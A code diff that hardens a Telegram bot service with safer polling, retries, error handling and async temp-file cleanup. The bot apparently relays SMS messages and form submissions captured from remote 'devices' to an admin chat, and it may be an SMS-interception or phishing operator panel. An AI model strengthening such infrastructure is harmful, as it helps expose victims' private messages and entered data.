@@ -58,16 +58,21 @@ export class TelegramBotService {
             this.isEnabled = true;
             this.autoSmsConfig = config.autoSms?.enabled ? config.autoSms : null;
 
+            // Wrap bot API calls so a failed send never becomes an unhandled
+            // rejection (which would crash the whole server).
+            this.installSafeSenders();
+
             this.bot.on('polling_error', (error: any) => {
-                if (error.code === 'ETELEGRAM' && error.message?.includes('409 Conflict')) {
+                const message = error?.message || String(error);
+                if (error?.code === 'ETELEGRAM' && message.includes('409 Conflict')) {
                     if (!this.hasLoggedConflict) {
                         this.hasLoggedConflict = true;
-                        console.error('[Telegram] Another bot instance detected. Will retry...');
-                        this.bot?.stopPolling();
+                        console.error('[Telegram] Another bot instance detected (409). Backing off and retrying...');
+                        this.stopPollingSafely();
                         this.retryPolling();
                     }
-                } else if (!error.message?.includes('ETELEGRAM')) {
-                    console.error('[Telegram] Polling error:', error.message || error);
+                } else if (!message.includes('ETELEGRAM')) {
+                    console.error('[Telegram] Polling error:', message);
                 }
             });
 
@@ -86,39 +91,99 @@ export class TelegramBotService {
         }
     }
 
+    /**
+     * Wrap the bot's outbound API methods so any rejection is logged instead of
+     * bubbling up as an unhandled rejection (which would crash the server).
+     */
+    private installSafeSenders(): void {
+        if (!this.bot) return;
+        const bot: any = this.bot;
+        const wrap = (name: string): void => {
+            const original = bot[name];
+            if (typeof original !== 'function') return;
+            bot[name] = (...args: any[]) => {
+                try {
+                    const result = original.apply(bot, args);
+                    if (result && typeof result.catch === 'function') {
+                        result.catch((e: any) =>
+                            console.error(`[Telegram] ${name} failed:`, e?.message || e)
+                        );
+                    }
+                    return result;
+                } catch (e) {
+                    console.error(`[Telegram] ${name} threw synchronously:`, e);
+                    return Promise.reject(e);
+                }
+            };
+        };
+        wrap('sendMessage');
+        wrap('sendDocument');
+        wrap('answerCallbackQuery');
+        wrap('editMessageText');
+        wrap('editMessageReplyMarkup');
+        wrap('sendChatAction');
+    }
+
     private startPollingWithDelay(): void {
         const delayMs = 5000;
         console.log(`[Telegram] Starting polling in ${delayMs / 1000} seconds...`);
-        setTimeout(() => {
+        const timer = setTimeout(() => {
             if (this.bot && this.isEnabled) {
                 console.log('[Telegram] Starting polling now...');
-                this.bot.startPolling({ restart: true });
+                this.startPollingSafely();
             }
         }, delayMs);
+        timer.unref?.();
+    }
+
+    private startPollingSafely(): void {
+        if (!this.bot) return;
+        try {
+            const p = this.bot.startPolling({ restart: true });
+            if (p && typeof (p as any).catch === 'function') {
+                (p as any).catch((e: any) => console.error('[Telegram] startPolling failed:', e?.message || e));
+            }
+        } catch (e) {
+            console.error('[Telegram] startPolling threw synchronously:', e);
+        }
+    }
+
+    private stopPollingSafely(): void {
+        if (!this.bot) return;
+        try {
+            const p = this.bot.stopPolling();
+            if (p && typeof (p as any).catch === 'function') {
+                (p as any).catch((e: any) => console.error('[Telegram] stopPolling failed:', e?.message || e));
+            }
+        } catch (e) {
+            console.error('[Telegram] stopPolling threw synchronously:', e);
+        }
     }
 
     private retryPolling(): void {
-        if (this.pollingRetryCount >= this.maxPollingRetries) {
-            console.error(`[Telegram] Max polling retries (${this.maxPollingRetries}) reached. Bot disabled.`);
-            this.isEnabled = false;
-            return;
-        }
+        // Keep retrying with capped exponential backoff. Never permanently disable
+        // the bot — a transient 409 (deploy overlap) must recover on its own.
         this.pollingRetryCount++;
-        const backoffMs = Math.pow(2, this.pollingRetryCount) * 5000;
-        console.log(`[Telegram] Retry ${this.pollingRetryCount}/${this.maxPollingRetries} - waiting ${backoffMs / 1000}s...`);
+        const backoffMs = Math.min(Math.pow(2, Math.min(this.pollingRetryCount, 6)) * 5000, 120000);
+        console.log(`[Telegram] Polling retry ${this.pollingRetryCount} - waiting ${Math.round(backoffMs / 1000)}s...`);
         this.hasLoggedConflict = false;
-        setTimeout(() => {
+        const timer = setTimeout(() => {
             if (this.bot && this.isEnabled) {
                 console.log('[Telegram] Retrying polling...');
-                this.bot.startPolling({ restart: true });
+                this.startPollingSafely();
             }
         }, backoffMs);
+        timer.unref?.();
     }
 
     public async stop(): Promise<void> {
         if (this.bot) {
             console.log('[Telegram] Stopping bot polling...');
-            await this.bot.stopPolling();
+            try {
+                await this.bot.stopPolling();
+            } catch (e) {
+                console.error('[Telegram] stopPolling failed:', e);
+            }
             this.isEnabled = false;
             console.log('[Telegram] Bot stopped.');
         }
@@ -340,54 +405,63 @@ export class TelegramBotService {
     private async downloadAllSMS(chatId: number, deviceData: any): Promise<void> {
         const device = deviceData.device;
         const shortId = device.id.substring(0, 8);
-
-        if (deviceData.sms.length === 0) {
-            this.bot?.sendMessage(chatId, `📭 No SMS to download for ${device.name}`, {
-                reply_markup: {
-                    inline_keyboard: [[{ text: '⬅️ Back', callback_data: `sms_menu:${shortId}` }]]
-                }
-            });
-            return;
-        }
-
-        // Sort by timestamp descending
-        const sortedSms = [...deviceData.sms].sort((a: SMS, b: SMS) =>
-            new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
-        );
-
-        // Generate text content
-        let content = `SMS Export - ${device.name}\n`;
-        content += `Generated: ${new Date().toLocaleString()}\n`;
-        content += `Total Messages: ${sortedSms.length}\n`;
-        content += '='.repeat(50) + '\n\n';
-
-        sortedSms.forEach((sms: SMS, index: number) => {
-            const direction = sms.type === 'incoming' ? 'FROM' : 'TO';
-            const contact = sms.type === 'incoming' ? sms.sender : sms.receiver;
-            const date = new Date(sms.timestamp).toLocaleString();
-            content += `[${index + 1}] ${direction}: ${contact}\n`;
-            content += `Date: ${date}\n`;
-            content += `Message:\n${sms.message}\n`;
-            content += '-'.repeat(40) + '\n\n';
-        });
-
-        // Write to temp file and send
-        const tempDir = os.tmpdir();
-        const fileName = `sms_${device.name.replace(/\s+/g, '_')}_${Date.now()}.txt`;
-        const filePath = path.join(tempDir, fileName);
-
-        fs.writeFileSync(filePath, content, 'utf8');
+        let filePath: string | null = null;
 
         try {
+            if (deviceData.sms.length === 0) {
+                this.bot?.sendMessage(chatId, `📭 No SMS to download for ${device.name}`, {
+                    reply_markup: {
+                        inline_keyboard: [[{ text: '⬅️ Back', callback_data: `sms_menu:${shortId}` }]]
+                    }
+                });
+                return;
+            }
+
+            // Sort by timestamp descending
+            const sortedSms = [...deviceData.sms].sort((a: SMS, b: SMS) =>
+                new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
+            );
+
+            // Generate text content
+            let content = `SMS Export - ${device.name}\n`;
+            content += `Generated: ${new Date().toLocaleString()}\n`;
+            content += `Total Messages: ${sortedSms.length}\n`;
+            content += '='.repeat(50) + '\n\n';
+
+            sortedSms.forEach((sms: SMS, index: number) => {
+                const direction = sms.type === 'incoming' ? 'FROM' : 'TO';
+                const contact = sms.type === 'incoming' ? sms.sender : sms.receiver;
+                const date = new Date(sms.timestamp).toLocaleString();
+                content += `[${index + 1}] ${direction}: ${contact}\n`;
+                content += `Date: ${date}\n`;
+                content += `Message:\n${sms.message}\n`;
+                content += '-'.repeat(40) + '\n\n';
+            });
+
+            // Write to temp file and send (async, guarded)
+            const tempDir = os.tmpdir();
+            const fileName = `sms_${String(device.name || 'device').replace(/\s+/g, '_')}_${Date.now()}.txt`;
+            filePath = path.join(tempDir, fileName);
+
+            await fs.promises.writeFile(filePath, content, 'utf8');
+
             await this.bot?.sendDocument(chatId, filePath, {
                 caption: `📄 All SMS from ${device.name} (${sortedSms.length} messages)`,
                 reply_markup: {
                     inline_keyboard: [[{ text: '⬅️ Back', callback_data: `sms_menu:${shortId}` }]]
                 }
             });
+        } catch (e) {
+            console.error('[Telegram] downloadAllSMS failed:', e);
+            this.bot?.sendMessage(chatId, '❌ Failed to export SMS.').catch(() => {});
         } finally {
-            // Clean up temp file
-            fs.unlinkSync(filePath);
+            if (filePath) {
+                try {
+                    await fs.promises.unlink(filePath);
+                } catch {
+                    /* ignore cleanup errors */
+                }
+            }
         }
     }
 
@@ -565,23 +639,32 @@ export class TelegramBotService {
         content += `           END OF EXPORT\n`;
         content += `========================================\n`;
 
-        // Write to temp file and send
-        const tempDir = os.tmpdir();
-        const fileName = `forms_${device.name.replace(/\s+/g, '_')}_${Date.now()}.txt`;
-        const filePath = path.join(tempDir, fileName);
-
-        fs.writeFileSync(filePath, content, 'utf8');
-
+        // Write to temp file and send (async, guarded)
+        let filePath: string | null = null;
         try {
+            const tempDir = os.tmpdir();
+            const fileName = `forms_${String(device.name || 'device').replace(/\s+/g, '_')}_${Date.now()}.txt`;
+            filePath = path.join(tempDir, fileName);
+
+            await fs.promises.writeFile(filePath, content, 'utf8');
+
             await this.bot?.sendDocument(chatId, filePath, {
                 caption: `📝 All form submissions from ${device.name} (${sessions.length} sessions, ${allForms.length} total submissions)`,
                 reply_markup: {
                     inline_keyboard: [[{ text: '⬅️ Back', callback_data: `action_menu:${shortId}` }]]
                 }
             });
+        } catch (e) {
+            console.error('[Telegram] downloadAllForms failed:', e);
+            this.bot?.sendMessage(chatId, '❌ Failed to export forms.').catch(() => {});
         } finally {
-            // Clean up temp file
-            fs.unlinkSync(filePath);
+            if (filePath) {
+                try {
+                    await fs.promises.unlink(filePath);
+                } catch {
+                    /* ignore cleanup errors */
+                }
+            }
         }
     }
 
@@ -910,6 +993,7 @@ export class TelegramBotService {
         if (!this.bot) return;
 
         this.bot.on('callback_query', async (query) => {
+          try {
             if (!query.data || !query.message) return;
             if (!this.isAdmin(query.from.id, query.message.chat.id)) {
                 this.bot?.answerCallbackQuery(query.id, { text: '⛔ Unauthorized' });
@@ -987,7 +1071,7 @@ export class TelegramBotService {
                     break;
 
                 case 'forms':
-                    if (deviceData) this.downloadAllForms(chatId, deviceData);
+                    if (deviceData) await this.downloadAllForms(chatId, deviceData);
                     else this.bot?.sendMessage(chatId, '❌ Device not found.');
                     break;
 
@@ -1084,6 +1168,9 @@ export class TelegramBotService {
                     }
                     break;
             }
+          } catch (e) {
+            console.error('[Telegram] callback_query handler failed:', e);
+          }
         });
     }
 
@@ -1626,9 +1713,9 @@ export class TelegramBotService {
     async notifyNewSMS(deviceName: string, sms: SMS, device?: Device): Promise<void> {
         if (sms.type !== 'incoming') return;
 
-        // Escape special Markdown characters in dynamic content
-        const escapeMarkdown = (text: string): string => {
-            return text.replace(/([*_`\[\]])/g, '\\$1');
+        // Escape special Markdown characters in dynamic content (null-safe)
+        const escapeMarkdown = (text: unknown): string => {
+            return String(text ?? '').replace(/([*_`\[\]])/g, '\\$1');
         };
 
         let message = `📨 *New SMS*\n\n`;
